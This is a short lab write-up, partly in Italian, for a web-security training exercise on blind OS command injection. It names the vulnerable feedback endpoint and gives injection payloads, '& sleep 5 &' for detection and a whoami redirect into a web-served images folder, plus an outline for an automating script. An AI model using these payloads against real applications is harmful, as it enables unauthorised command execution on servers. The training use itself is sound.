@@ -1,0 +1,55 @@
+Lab: Blind OS command injection with output redirection
+
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details.
+The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command.
+There is a writable folder at: /var/www/images/
+The application serves the images for the product catalog from this location.
+You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
+
+To solve the lab, execute the whoami command and retrieve the output.
+
+
+
+VULNERABILITA'
+
+Pagina vulnerabile: /submit/feedback
+Metodo: POST
+Risposta:
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2
+
+{}
+
+Paramentri richiesta POST: csrf=3zPgBYG977oF3vVFbnpxTepZqKvbJVOZ&name=test&email=test%40test.test&subject=test&message=test
+
+
+
+1) Individuare se uno dei parametri è vulnerabile:
+Exploit: & sleep 5 &
+
+Name: no
+Email: sì
+Subject: no
+Message: no
+
+
+2) Exploit di reindirizzamento output comando in file in percorso accessibile a chi visita il sito
+Exploit: & whoami > /var/www/images/whoami.txt #
+
+Percorso file whoami.txt: https://****.web-security-academy.net/image?filename=whoami.txt
+In questo caso, nome utente: peter-skyxuo
+
+
+
+
+
+Struttura scritpt.
+
+1) Input = url + comando
+2) Estrarre token CSRF da pagin /feedback
+3) Eseguire comando con redirect output in file .txt
+4) Recuper del file .txt e contenuto a video
